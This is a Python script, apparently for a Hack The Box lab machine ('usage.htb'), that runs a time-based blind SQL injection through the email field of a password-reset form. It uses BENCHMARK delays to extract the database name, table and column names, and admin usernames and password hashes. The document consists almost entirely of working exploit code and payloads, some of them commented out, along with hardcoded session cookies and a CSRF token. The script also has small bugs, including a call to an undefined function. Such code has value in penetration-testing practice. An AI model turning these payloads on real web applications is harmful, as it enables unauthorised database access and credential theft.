#!/usr/bin/python3
from pwn import *
import requests, signal, pdb, sys, time, string

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...\n")
  sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://usage.htb/forget-password"
Headers = {"Cookie": "XSRF-TOKEN=eyJpdiI6InE2OGo5K2NVMGthb1lCREZSalFraUE9PSIsInZhbHVlIjoiUXRTT0xWNlJTdkZCWlJ1V0NvcFFDOWJiKzNWUldsR1d1NHlHWVB2N2hNN2p3Wnk3c04rOVI0RHN5WWN4aDUxMGMrOE1rU1hLdEFkMC9XK2RodmVIZFB3bENQNXI5SFhrRFFBK3UydkFDWWtuRXNwbTVnWm5NVGVpa0JoOVJRL2ciLCJtYWMiOiIyNzM4MmNhMDYyMGFlZDMyY2M1ODMzMGFlODJhNzk5YWE0NzA0YzgyZjNjNzM0ZDlhYmQ0NzFkYjA2OWQ5MzViIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjlrM0MxcVFFWTljVFJWWTl1aksvNWc9PSIsInZhbHVlIjoiS0dnT0pWbVBwbXJNV2VZYW45N2RRRWRvZkVKMVhLKzBteVpzVGc1VlE4cVUvbStNeW1qL0dxcSt1N2s1K1NCWU5WcHNlTHJDOEJaZzBRaXNSenQ1dUIxRE5pVnIySk5uOFJBTS9iUUIwOERKUEtCcVNzNXM3VGlrcWcrbk1Ma1QiLCJtYWMiOiI3NWNlODQ0NGU4YTlhNDZiZjg4NzU5OWRiMWZmNjg1Y2FhMDY2ZTQ2ZGMyOTYzNzg1NzhiNTYwYjg0ZmJiNzJkIiwidGFnIjoiIn0%3D"}
characters = string.ascii_lowercase + '-_'
allCharacters = string.printable
threshold = 3  # Valor umbral de tiempo en segundos para determinar si la condición es verdadera
table_name = "usage_blog"  # Reemplaza con el nombre de tu tabla
column_names = []
token = "X4PnOuQFshhTxDkJOKi7e3yEeY7fKfgdxShFH3b8"
p1 = log.progress("Fuerza bruta")
p2 = log.progress("Extrayendo data: ")

def makeSQLI(table_position, table_length):
    tables = ""
    p1.status("Iniciando proceso de fuerza bruta")

    for position in range(1, table_length+1):
        response_times = []

        # for character in characters:
        for character in allCharacters:
            # obtener el nombre de la tabla
            # payload = "test@gmail.com' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='usage_blog' and table_name='admin_users' LIMIT %d,1),%d,1)='%s', BENCHMARK(7000000, MD5(0x12345678)),1)-- -" % (table_position, position, character)
            
            # obtener el nombre de las columnas
            # payload = "test@gmail.com' AND IF(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='usage_blog' and table_name='admin_users' LIMIT %d,1),%d,1)='%s', BENCHMARK(7000000, MD5(0x12345678)),1)-- -" % (table_position, position, character)
            
            # obtener el contenido de las columnas
            payload = f"IF(BINARY SUBSTR((SELECT group_concat(name, 0x3a, password) FROM admin_users),{position},1)='{character}', BENCHMARK(7000000, MD5(0x12345678)),1)-- -"
           
            
            elapsed_time = measure_response_time(payload)

            response_times.append((elapsed_time, character))

        # Encontrar el carácter con el mayor tiempo de respuesta
        max_time_char = max(response_times, key=lambda x: x[0])
        tables += max_time_char[1]
        p2.status(tables)
    tables += ','

# Función para medir el tiempo de respuesta
def measure_response_time(payload):
    data = {
        "_token": token,
        "email": f"test@gmail.com' AND {payload}-- -"
    }
    p1.status(data['email'])

    start_time = time.time()
    response = requests.post(login_url, headers=Headers, data=data, allow_redirects=False)
    elapsed_time = time.time() - start_time
    return elapsed_time

# Función para encontrar la longitud del nombre de una base de datos o columna
def get_name_length(name_length, table_position):
    response_times = []  # Lista para almacenar los tiempos de respuesta y las longitudes correspondientes

    for length in range(1, name_length):  # Asumimos que la longitud no es mayor a 20 caracteres
        # Obtener longitud de nombre de la base de datos
        payload = f"IF(LENGTH(DATABASE())={length}, BENCHMARK(7000000, MD5(0x12345678)), 1)"
        # payload = f"IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='usage_blog' LIMIT 1 OFFSET {table_position}) = {length}, BENCHMARK(7000000, MD5(0x12345678)), 1)"
        # payload = f"IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema='usage_blog' and table_name='admin_users' LIMIT 1 OFFSET {table_position}) = {length}, BENCHMARK(7000000, MD5(0x12345678)), 1)"
        # payload = f"IF((SELECT LENGTH(group_concat(name, 0x3a, password)) FROM admin_users LIMIT 1 OFFSET {table_position}) = {length}, BENCHMARK(7000000, MD5(0x12345678)), 1)"
       
        response_time = measure_response_time(payload)
        response_times.append((response_time, length))  # Almacenar el tiempo de respuesta y la longitud

    # Encontrar la longitud con el mayor tiempo de respuesta
    max_time_length = max(response_times, key=lambda x: x[0])
    return max_time_length[1]  # Devolver la longitud correspondiente al mayor tiempo de respuesta

def get_all_table_name_lengths():
    table_lengths = []
    # table_position = 0

    for table_position in range(2, 10):
        try:
            length = get_column_name_length(table_position)
            if length > 0:
                table_lengths.append(length)
                print(f"Table at position {table_position} has length: {length}")
                makeSQLI(table_position, length)
            else:
                break
        except Exception as e:
            print(f"No more tables found or error occurred: {str(e)}")
            break

    return table_lengths
    
# Función para descubrir el nombre de la base de datos
def get_database_name(length):
    tables = ""
    for position in range(1, length + 1):
        response_times = []

        for character in characters:
            payload = f"IF(SUBSTRING(DATABASE(), {position}, 1)='{character}', BENCHMARK(7000000, MD5(0x12345678)), 1)"
            response_time = measure_response_time(payload)
            response_times.append((response_time, character))

        max_time_char = max(response_times, key=lambda x: x[0])
        tables += max_time_char[1]
        p2.status(tables)
    tables += ','

if __name__ == '__main__':
    # obtener la longitud de la primera tabla
    # column_name_length = get_name_length(1)
    
    # makeSQLI(name_length)
    # print('Longitud del nombre de la primera tabla: ',column_name_length)
    
    # obtener el contenido de las columnas
    # name_password = makeSQLI(0,74)
    # print(name_password)

    # get database name
    db_length = get_name_length(20,80)
    if db_length:
        print(f"Database name length: {db_length}")
        get_database_name(db_length)
    else:
        print("Could not determine the database name length.")